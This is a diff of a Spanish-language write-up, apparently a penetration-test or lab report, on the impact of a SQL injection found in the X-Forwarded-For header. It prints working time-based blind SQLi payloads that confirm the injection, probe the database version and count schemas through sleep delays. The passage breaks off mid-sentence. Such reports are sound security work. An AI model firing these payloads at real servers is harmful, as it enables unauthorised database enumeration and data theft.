@@ -13,9 +13,9 @@ Algunas consideraciones
 ## Impacto vulnerabilidad SQLi
 
 ### Procedimiento:
-Partiendo de la base en la que podemos validar una inyección exitosa con
+Partiendo de la base en la que podemos validar una inyección exitosa en la cabecera `X-Forwarded-For` con `hack' or sleep(2) #`, además de que podemos consultar la versión de la base de datos con `test' or if(substring(@@version,1,1)='5',sleep(1),0) #`, buscamos con scrip1.sh hacer que el servidor SQL duerma 1 seg. que en el caso de la inyección, equivale a sleep(0.043), sólo si el número total de bases de datos es igual a un número que estamos probando. Para ello utilizamos la siguiente sentencia:
 ```mysql
-1' OR IF((SELECT SUBSTRING($column,$position,1) FROM $db_name.$table_name LIMIT $row_index,1)='$char', SLEEP(0.043), 0) #
+1' or if((SELECT COUNT(SCHEMA_NAME) FROM INFORMATION_SCHEMA.SCHEMATA) = 'num', sleep(0.043), 0) #
 ```
 Procedimos a 
 ```python
